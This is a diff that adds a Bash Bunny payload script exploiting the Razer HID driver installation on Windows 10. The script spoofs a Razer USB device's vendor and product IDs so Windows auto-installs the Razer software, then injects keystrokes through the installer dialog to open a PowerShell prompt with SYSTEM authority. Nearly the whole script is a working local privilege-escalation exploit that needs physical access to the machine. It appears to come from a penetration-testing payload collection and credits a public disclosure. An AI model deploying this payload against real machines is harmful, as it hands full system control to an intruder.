@@ -1,0 +1,40 @@
+# Title:         Razer System Shell
+# Description:   Exploit Razer USA HID driver installation to System authority PowerShell. 
+#                This is heavily based on Tweet by @_MG_ on 22nd Aug 2021 but modified to work with BashBunny
+# Author:        Emptyhen
+# Props:         @_MG_, @Hak5Darren, @KalaniMakutu - Original Concept
+                 Cribbit, NightGhost - Great suggestions to clean up the PoC.
+# Version:       0.1
+# Category:      Execution
+# Target:        Windows 10 (Powershell)
+# Attackmodes:   Serial, HID
+
+LED SETUP
+
+# Serial isn't actually used but appears to be required to make the HID work correctly.
+ATTACKMODE SERIAL HID VID_0X1532 PID_0X0064
+
+# Long delay to allow the driver installation and wait for the Razer Synaptics to start up.
+# Note this only happens after the driver is installed - to run this again, remove the Razer HID driver in Device Manager.
+LED STAGE1
+QUACK DELAY 40000
+
+# Inject Keystrokes to Launch a Powershell Window.
+LED STAGE2
+QUACK SPACE
+for run in {1..5}; do QUACK TAB; done
+QUACK RIGHT
+QUACK RIGHT
+QUACK ENTER
+QUACK DELAY 500
+QUACK ALT D
+QUACK STRING powershell
+QUACK ENTER
+
+# A 'nt autority\system' PowerShell prompt should get spawned. 
+LED STAGE3
+QUACK DELAY 10000
+QUACK STRING whoami
+QUACK ENTER
+
+LED FINISH
